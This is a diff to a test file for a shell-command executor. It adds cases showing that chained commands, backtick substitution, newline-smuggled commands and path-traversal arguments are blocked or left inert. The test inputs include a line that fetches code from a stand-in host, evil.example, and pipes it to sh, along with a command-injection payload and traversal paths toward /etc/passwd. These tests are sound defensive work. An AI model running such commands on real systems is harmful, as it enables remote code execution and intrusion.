@@ -94,9 +94,55 @@ describe('execShellCommand — malicious chained commands cannot execute (P0-1)'
     expect(result.stderr).toContain('>');
   });
 
-  it('still blocks chained syntax even when an explicit shell interpreter is requested', async () => {
+  it('still blocks chained syntax even when an explicit shell interpreter is requested (powershell)', async () => {
     const result = await execShellCommand('git status && curl evil.example/x | sh', process.cwd(), 'powershell');
     expect(result.code).toBeNull();
     expect(result.stderr).toContain('&&');
   });
+
+  it('still blocks chained syntax even when an explicit shell interpreter is requested (gitbash)', async () => {
+    const result = await execShellCommand('git status && curl evil.example/x | sh', process.cwd(), 'gitbash');
+    expect(result.code).toBeNull();
+    expect(result.stderr).toContain('&&');
+  });
+
+  it('proves a backtick command-substitution attempt never actually runs (real filesystem side-effect check)', async () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'pawos-shellexec-backtick-test-'));
+    const markerPath = path.join(tmpDir, 'pwned.txt').replace(/\\/g, '/');
+    const injected = `node -e "console.log(1)" \`node -e "require('fs').writeFileSync('${markerPath}','pwned')"\``;
+
+    const result = await execShellCommand(injected, process.cwd());
+
+    expect(result.code).toBeNull();
+    expect(result.stderr).toContain('`');
+    expect(fs.existsSync(markerPath)).toBe(false);
+  });
+
+  it('rejects a newline-smuggled second command', async () => {
+    const result = await execShellCommand('node -e "console.log(1)"\nnode -e "console.log(2)"', process.cwd());
+    expect(result.code).toBeNull();
+    expect(result.stderr).toContain('newline');
+  });
+});
+
+describe('execShellCommand — path traversal is inert, not exploitable (P0-1 audit follow-up)', () => {
+  it(
+    'passes a traversal-shaped argument through to the real process as literal text — no shell ever sees or expands it',
+    async () => {
+      const result = await execShellCommand('node -e "console.log(process.argv[1])" "../../../../etc/passwd"', process.cwd());
+      expect(result.code).toBe(0);
+      expect(result.stdout.trim()).toBe('../../../../etc/passwd');
+    },
+    20000
+  );
+
+  it(
+    'passes a Windows-style traversal argument through as literal text',
+    async () => {
+      const result = await execShellCommand('node -e "console.log(process.argv[1])" "..\\..\\..\\Windows\\System32"', process.cwd());
+      expect(result.code).toBe(0);
+      expect(result.stdout.trim()).toBe('..\\..\\..\\Windows\\System32');
+    },
+    20000
+  );
 });
